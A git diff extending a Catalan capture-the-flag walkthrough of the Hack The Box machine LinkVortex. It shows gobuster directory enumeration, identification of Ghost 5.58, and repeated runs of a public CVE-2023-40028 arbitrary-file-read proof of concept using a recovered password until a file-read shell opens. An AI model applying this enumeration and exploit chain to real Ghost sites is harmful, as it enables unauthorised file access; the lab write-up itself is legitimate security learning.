@@ -482,6 +482,37 @@ Sembla que l'únic interessant trobat és el que sembla ser un repositori de Git
 
 ![image](https://github.com/user-attachments/assets/660a407a-8821-47f0-9240-84a0381d6a62)
 
+I si fem amb `gobuster del domini, amb un reconeixement de directoris trobem el següent també:
+````
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir --url http://linkvortex.htb --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --exclude-length 0
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://linkvortex.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          0
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 179] [--> /assets/]
+/LICENSE              (Status: 200) [Size: 1065]
+/ghost                (Status: 200) [Size: 1065]
+/server-status        (Status: 403) [Size: 199]
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+===============================================================
+````
+
+On si anem a http://linkvortex.htb/ghost veiem un dashboard on fer login.
 
 El que faré serà descarregar el repositori amb les dades que hi ha al fitxer config:
 ```
@@ -502,6 +533,9 @@ drwxrwxr-x 3 kali kali 4096 Dec 10 10:57 .
 drwxr-xr-x 5 kali kali 4096 Dec 10 10:57 ..
 drwxrwxr-x 9 kali kali 4096 Dec 10 10:59 Ghost
 ```
+
+On veiem que hi ha ghost també, com el directori que hem trobat amb gobuster que té un dashboard...
+
 ```
 ┌──(kali㉿kali)-[~/Documents/LinkVortex]
 └─$ cd Ghost     
@@ -686,5 +720,77 @@ const password = 'OctopiFociPilfer45';
 Provarem aquestes credencials a veure i alguna ens serveix per accedir per ssh a la màquina.
 
 
-## MÀQUINA EN PROGRÉS 
+Després de perdre el temps durant força estona amb les credencials obtingudes i d'intentar accedir a la pàgina de login que no carrega al fer clic si anem al domini a través del navegador web i de no poder connectar per ssh. Per tant, com que sabem quina tecnologia/eina utilitza la pàgina, que és Ghost (https://ghost.org/), si anem a veure el codi font podem veure'n la versió:
+
+</script>
+
+    <meta name="generator" content="Ghost 5.58">
+    <link rel="alternate" type="application/rss+xml" title="BitByBit Hardware" href="http://linkvortex.htb/rss/">
+
+
+Ara per tant, buscarem algun CVE o POC si és que en té que ens permeti accedir a la màquina. Sembla que he trobat un POC a un repositori de GitHub del CVE-2023-40028 que afecta a les versions de Ghost anteriors a la 5.59.1: https://github.com/0xyassine/CVE-2023-40028. El que fa aquest poc és "permetre als usuaris autenticats penjar fitxers que són enllaços simbòlics. Això es pot aprofitar per realitzar una lectura de fitxer arbitrari de qualsevol fitxer del sistema operatiu amfitrió. Es recomana que els administradors del lloc comprovin l'explotació d'aquest problema buscant enllaços simbòlics desconeguts dins del contingut/carpeta de Ghost. La versió 5.59.1 conté una solució per a aquest problema i no hi ha cap solució alternativa coneguda.". A més a més, complim amb els seus dos requeriments:
+
+    Accés a una versió Ghost vulnerable (anterior a la 5.59.1)
+    Compte d'usuari autenticat
+
+
+Ja que el compte d'usuari autenticat ha de ser alguna de les dos contrasenyes que hem trobat abans.
+
+Per tant, anem a provar què obtenim amb ell. Primer editem l'script i canviem el 127.0.0.1 per el nom de domini que tenim posat al nostre fitxer /etc/hosts: `GHOST_URL='http://linkvortex.htb'`.
+
+Ara donem permisos d'execució a l'script i l'executem i el propi script ja ens diu com s'ha d'utilitzar:
+
+                                                                                                                                 
+┌──(kali㉿kali)-[~/Documents/LinkVortex]
+└─$ nano CVE-2023-40028.sh 
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Documents/LinkVortex]
+└─$ ./CVE-2023-40028.sh 
+Usage: ./CVE-2023-40028.sh -u username -p password
+
+Per tant he fet vàries amb el nom d'usuari amb les password que hem trobat però no me'n he ensortit:
+                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/LinkVortex]
+└─$ ./CVE-2023-40028.sh -u admin -p OctopiFociPilfer45
+[!] INVALID USERNAME OR PASSWORD
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Documents/LinkVortex]
+└─$ ./CVE-2023-40028.sh -u test -p OctopiFociPilfer45
+[!] INVALID USERNAME OR PASSWORD
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Documents/LinkVortex]
+└─$ ./CVE-2023-40028.sh -u linkvortex -p OctopiFociPilfer45
+[!] INVALID USERNAME OR PASSWORD
+                                                              
+
+Per tant, ara buscaré altra vegada contrasenyes dins el repositori a veure si trobo un correu complert com aquest test@example.com però que no sigui de test ja que el de test no ha funcionat. Provo de fer un grep al repositori però en comptes de amb test amb admin@ a veure si trobem algun usuari que sembli vàlid:
+
+┌──(kali㉿kali)-[~/Documents/LinkVortex/Ghost]
+└─$ grep -r "admin@" .
+
+./ghost/admin/tests/acceptance/staff-test.js://             admin = this.server.create('user', {email: 'admin@example.com', roles: [adminRole]});
+./ghost/admin/tests/acceptance/staff-test.js://             await fillIn('.fullscreen-modal input[name="email"]', 'admin@example.com');
+./ghost/admin/tests/acceptance/staff-test.js://             admin = this.server.create('user', {email: 'admin@example.com', roles: [ownerRole]});
+./ghost/core/test/e2e-api/admin/users.test.js:            user: testUtils.DataGenerator.forKnex.createUser({email: 'test+admin@ghost.org', slug: 'admin'}),
+./yarn.lock:intersection-observer-admin@~0.3.2:
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                    email: 'newadmin@test.com',
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:        await modal.getByLabel('Email').fill('newadmin@test.com');
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:        await expect(listItem.getByText('newadmin@test.com')).toBeVisible();
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                email: 'newadmin@test.com',
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                    email: 'newadmin@test.com',
+
+
+N'hem trobat vàris, però tampoc funciona newadmin@test.com ni admin@example.com per tant provaré el nom de la màquina amb admin i la password trobada:
+
+┌──(kali㉿kali)-[~/Documents/LinkVortex]
+└─$ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
+WELCOME TO THE CVE-2023-40028 SHELL
+file> 
+
+
+Sembla que ha funcionat, però no trobo res a través d'això. 
+
+Per tant, ara el següent pas serà provar aquestes credencials al dashboard de ghost trobat a http://dev.linkvortex.htb/ghost:
+
+MÀQUINA EN PROCÉS.
 
